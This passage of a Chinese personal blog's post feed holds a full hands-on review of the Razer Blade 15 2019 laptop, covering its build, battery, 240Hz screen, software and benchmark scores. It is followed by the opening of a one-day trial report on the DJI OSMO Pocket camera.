src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a 